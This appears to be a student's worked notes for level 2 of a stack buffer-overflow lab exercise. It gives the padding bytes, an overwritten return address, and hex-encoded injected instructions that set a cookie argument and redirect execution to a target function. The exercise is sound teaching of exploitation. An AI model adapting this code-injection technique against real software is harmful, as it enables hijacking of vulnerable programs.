
## Level 2

   │0x4016e2 <touch2>       sub    $0x8,%rsp

What I need to do

As a return address we put 55 61 74 a0
Then in this location we write :

mov cookie, %rdi

Then we change the stack return pointer again
mov addressTouch2, $rsp
retq

This is exactly:

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a8 74 61 55 00 00 00 00
movq $0x50fa73aa, %rdi
movq $0x4016e2, (%rsp)
retq

Very important do a MOVQ for RETQ (cause it pops a 64bits)
48 c7 c7 aa 73 fa 50 	mov    $0x50fa73aa,%rdi
   7:	48 c7 04 24 e2 16 40 	movq   $0x4016e2,(%rsp)
   e:	00 
   f:	c3         


00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a8 74 61 55 00 00 00 00
48 c7 c7 aa 73 fa 50       //No padding in instructions, but padding if instruction uses a hardcoded integer !
48 c7 04 24 e2 16 40 00 // Like here the address is 4016e2 and not c34016e2
c3


